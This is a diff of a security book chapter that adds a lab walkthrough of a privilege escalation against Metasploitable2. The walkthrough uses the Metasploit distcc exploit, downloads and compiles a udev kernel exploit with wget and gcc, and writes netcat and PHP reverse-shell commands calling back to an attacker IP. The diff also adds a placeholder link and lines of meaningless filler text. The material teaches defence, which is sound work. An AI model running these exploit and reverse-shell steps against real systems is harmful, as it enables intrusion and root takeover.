@@ -71,7 +71,7 @@ The Metasploit PSExec module (`exploit/windows/smb/psexec`) uses basically the s
 
 The following attack was the last of five that I demonstrated at WDCNZ in 2015. The [previous demo](#wdcnz-demo-4) of that series will provide some additional context and it is probably best to look at it first if you have not already.
 
-You can find the video of how it is played out [here](https://www.youtube.com/watch?v=1EvwwYiMrV4).
+You can find the video of how it is played out at [http://youtu.be/1EvwwYiMrV4](http://youtu.be/1EvwwYiMrV4).
 
 I> ## Synopsis
 I>
@@ -166,17 +166,17 @@ If the target file that an attacker wants to swap for a trojanised version is wo
 {#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation-mitigations}
 1. The first risk is at the file permission and ownership level
     1. The first tool we can pull out of the bag is [unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check), which has its source code on [github](https://github.com/pentestmonkey/unix-privesc-check) and is also shipped with Kali Linux, but only the 1.x version (`unix-privesc-check` single file), which is fine, but the later version which sits on the master branch (`upc.sh` main file plus many sub files) does a lot more, so it can be good to use both. You just need to get the shell file(s) from either the `1_x` or `master` branch onto your target machine and run. Running as root allows the testing to be a lot more thorough for obvious reasons. If I'm testing my own host, I will start with the `upc.sh`, I like to test as a non root user first, as that is the most realistic in terms of how an attacker would use it. Simply looking at the main file will give you a good idea of the options, or you can just run:  
-    `upc.sh -h`  
+    `./upc.sh -h`  
         
         
         To run:  
         `# Produces a reasonably nice output`  
-        `upc.sh > upc.output`  
+        `./upc.sh > upc.output`  
         
         
     2. [LinEnum](https://github.com/rebootuser/LinEnum) is also very good at host reconnaissance, providing a lot of potentially good information on files that can be trojanised.
 2. The second risk is at the mount point of the file system. This is quite easy to test and it also takes precedence over file permissions, as the mount options apply to the entire mounted file system. This is why applying as restrictive as possible permissions to granular file system partitioning is so effective.
-    1. First and easiest command to run is:  
+    1. The first and easiest command to run is:  
     `mount`  
     This will show you the options that all of your file systems were mounted with. In the Countermeasures we address how to improve the permissiveness of these mounted file systems.
     2. For peace of mind, I usually like to test that the options that our file systems appear to be mounted with actually are. You can make sure by trying to write an executable file to the file systems that have `noexec` as specified in `/etc/fstab` and attempt to run it, it should fail.
@@ -204,7 +204,135 @@ This adds the `suid` bit, read, write and execute for `owner`, read and execute 
 
 So for example if root owns a file and the file has its `suid` bit set, anyone can run that file as root.
 
-Just as I showed you in the Penetration Testing section of the Process and Practises chapter in Fascicle 0, after we have performed our above reconnaissance, it is time to move to the Vulnerability Scanning / Discovery stage. We should have plenty of information on potentially vulnerable files that we can now workout how to exploit.
+
+
+
+
+
+
+![](images/HandsOnHack.png)
+
+Just as I showed you in the Penetration Testing section of the Process and Practises chapter in Fascicle 0, we will now walk through the steps of how an attacker may carry out a privilege escalation. 
+
+You can find the video of how it is played out at [todo](todo).
+
+I> ## Synopsis
+I>
+I> First we carry out some reconnaissance on our target machine. I am using Metasploitable2 for this play.  
+I> We find a suitable open port with a defective service listening, that is our Vulnerability Scanning / Discovery stage.  
+I> We then search for an exploit that may be effective at giving us at least low privilege access to the machine.  
+I> We then use the tools I have just discussed above to help us find possible writeable, executable directories and/or files.  
+I> We then search for exploits that may help us escalate our privileges, based on an area in the file system that we now know we have write and execute permissions on.  
+I> We then walk through understanding a chosen exploit and preparing it to be run.
+
+{icon=bomb}
+G> ## The Play
+G>
+G> A simple nmap scan will show us any open ports.  
+G> One of the ports is 3632, with the `distcc` (distributed compiler, useful for speeding up source code compilation) daemon listening.  
+G>
+G> Let us check to see if Metasploit knows about any `distcc` exploits?
+G>
+G> 
+G> `msfconsole`  
+G> `msf > db_rebuild_cache`  
+G> `msf > search distcc`  
+G> `msf > use exploit/unix/misc/distcc_exec`  
+G> `msf exploit(distcc_exec) > set RHOST metasploitable`  
+G> `msf exploit(distcc_exec) > exploit`
+G>
+G> Now we have a shell. Let us test it.
+G>
+G> `pwd`  
+G> `/tmp`  
+G> `whoami`  
+G> `daemon`  
+G>
+G> All following commands can be run through our low privilege user.
+G>
+G> Running unix-privesc-check and directing the output to a file shows us:  
+G> {title="upc.output results", linenos=off, lang=bash}
+G>     I: [group_writable] /tmp is owned by user root (group root) and is group-writable (drwxrwxrwt)
+G>
+G> What about a file system that is mounted with permissions that will allow us to write a file that may be executed by one of the previously mentioned privileged services?  
+G>
+G> `mount`  
+G> Shows us that we have very little in the way of granular partitioning and we have `/` mounted as `rw`, so as a low privileged user, we can both write and execute files in `/tmp` for example.  
+G>
+G> We could also just search for "Privilege Escalation" exploits targeting our targets kernel.  
+G> Let us get the targets Kernel version:  
+G> `uname -a`  
+G> `2.6.24`
+G>
+G> This (https://www.exploit-db.com/exploits/8572/) looks like an interesting one. Can we compile this on the target though? Let us see if we have `gcc` handy:
+G> `dpkg -l gcc`  
+G> We do.
+G>
+G> udev is a device manager running as root for the Linux kernel. Before version 1.4.1 it did not verify whether a netlink message originated from kernel or user space,  
+G> which allowed users to supply their own, which we see in the exploit:  
+G> `sendmsg(sock, &msg, 0);`
+G>
+G> The exploit will run our payload that we will create soon which will open a reverse root shell (because udev is running as root) back to our attacking box.  
+G> We need to pass the PID of the netlink socket as a argument.  
+G> When a device is removed, the exploit leverages the 95-udev-late.rules functionality which runs arbitrary commands (which we are about to create in /tmp/run) via `REMOVE_CMD`  
+G> You can also see within the exploit that it adds executable permissions to our reverse shell payload. Now if we had `/tmp` mounted as we do in the `/etc/fstab` in the Countermeasures section, neither `/tmp/run` or `/tmp/privesc` would be able to execute.  
+G>
+G> Through our daemon shell that `distcc_exec` provided:  
+G> `wget --no-check-certificate https://www.exploit-db.com/download/8572 -O privesc.c`  
+G> Now check that the file has the contents that you expect.  
+G> `cat privesc.c`
+G>
+G> Let us compile it:  
+G> `gcc privesc.c -o privesc`  
+G> `ls -liah`  
+G> `privesc`
+G>
+G> Now we need the PID of the udevd netlink socket  
+G> `cat /proc/net/netlink`  
+G> Gives us `2302`  
+G> And to check:  
+G> `ps -aux | grep udev`  
+G> Gives us `2303` which should be one more than netlink
+G>
+G> Now we need something on the target to use to open a reverse shell. Netcat may not be available on a production web server, but if it is:  
+G> Open a connection to 192.168.56.20:1234, then run `/bin/bash`  
+G> `echo '#!/bin/bash' > run`  
+G> `echo '/bin/netcat -e /bin/bash 192.168.56.20 1234' >> run`  
+G> Another alternative is using php  
+G> `echo '#!/bin/bash' > run`  
+G> `echo "php -r '\$sock=fsockopen(\"192.168.56.20\",1234);exec(\"/bin/bash <&3 >&3 2>&3\");'" > run`  
+G> There are also many other options [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) to use for providing a reverse shell.
+G>
+G> On the attacking side:  
+G> `nc -lvp 1234`  
+G> `Listening on [any] 1234 ...`
+G>
+G> Now from our low privilege shell, user supplies message from user space (seen within the exploit) along with the PID of netlink:  
+G> `./privesc 2302`
+G>
+G> You should see movement on the listening netcat now.  
+G> `connect to [192.168.56.20] from metasploitable [192.168.56.21] 43542`  
+G> `whoami`  
+G> `root`
+G> and that is our privilege escalation, we now have root.
+
+
+
+{icon=bomb}
+G> ljljlkjlkjkljk
+G> ljlkjlkjkljkljkljjkl
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
